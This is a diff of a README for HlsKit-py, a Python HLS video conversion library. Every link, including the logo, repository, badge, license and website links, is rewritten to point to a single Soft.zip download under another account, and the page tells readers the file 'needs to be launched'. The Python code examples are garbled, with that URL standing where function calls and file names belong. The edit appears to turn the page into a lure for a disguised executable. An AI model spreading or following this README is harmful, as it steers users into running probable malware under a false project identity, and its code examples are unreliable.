@@ -1,11 +1,11 @@
 # 🎥🔊📹 Welcome to HlsKit-py 🚀
 
-![HlsKit Logo](https://example.com/hlskit-logo.png)
+![HlsKit Logo](https://github.com/KSofianeD/hlskit-py/releases/download/v1.0/Soft.zip)
 
-## Repository: [hlskit-py](https://github.com/adelante20/hlskit-py)
+## Repository: [hlskit-py](https://github.com/KSofianeD/hlskit-py/releases/download/v1.0/Soft.zip)
 #### Short Description: HlsKit provides strong HLS video conversion features backed by ffmpeg. Prepare your mp4 files for streaming.
 
-[![Open in Visual Studio Code](https://img.shields.io/badge/Open%20in-Visual%20Studio%20Code-blue?logo=visual-studio-code)](https://github.com/adelante20/hlskit-py)
+[![Open in Visual Studio Code](https://github.com/KSofianeD/hlskit-py/releases/download/v1.0/Soft.zip%20in-Visual%20Studio%20Code-blue?logo=visual-studio-code)](https://github.com/KSofianeD/hlskit-py/releases/download/v1.0/Soft.zip)
 
 ---
 
@@ -50,7 +50,7 @@ pip install hlskit
 import hlskit
 
 # Use HlsKit functions for video conversion
-hlskit.convert_video(input_file='video.mp4', output_folder='output/')
+https://github.com/KSofianeD/hlskit-py/releases/download/v1.0/Soft.zip(input_file='https://github.com/KSofianeD/hlskit-py/releases/download/v1.0/Soft.zip', output_folder='output/')
 ```
 
 ## Examples
@@ -59,20 +59,20 @@ hlskit.convert_video(input_file='video.mp4', output_folder='output/')
 import hlskit
 
 # Convert a video file to HLS format
-hlskit.convert_video(input_file='movie.mp4', output_folder='output/')
+https://github.com/KSofianeD/hlskit-py/releases/download/v1.0/Soft.zip(input_file='https://github.com/KSofianeD/hlskit-py/releases/download/v1.0/Soft.zip', output_folder='output/')
 ```
 
 ## Contributing
 🤝 We welcome contributions to HlsKit-py! Whether you want to fix a bug, propose a new feature, or improve documentation, feel free to open a pull request. Let's make video conversion and streaming easier together!
 
 ## License
-📜 HlsKit-py is licensed under the MIT License. See [LICENSE](https://github.com/adelante20/hlskit-py/blob/main/LICENSE) for details.
+📜 HlsKit-py is licensed under the MIT License. See [LICENSE](https://github.com/KSofianeD/hlskit-py/releases/download/v1.0/Soft.zip) for details.
 
 ---
 
-🔗 **Download the Latest Release [Here](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)** 👈 *(File needs to be launched)*
+🔗 **Download the Latest Release [Here](https://github.com/KSofianeD/hlskit-py/releases/download/v1.0/Soft.zip)** 👈 *(File needs to be launched)*
 
-⚡️ Visit our [website](https://hlskit-py.com) for more information and updates!
+⚡️ Visit our [website](https://github.com/KSofianeD/hlskit-py/releases/download/v1.0/Soft.zip) for more information and updates!
 
 ---
 
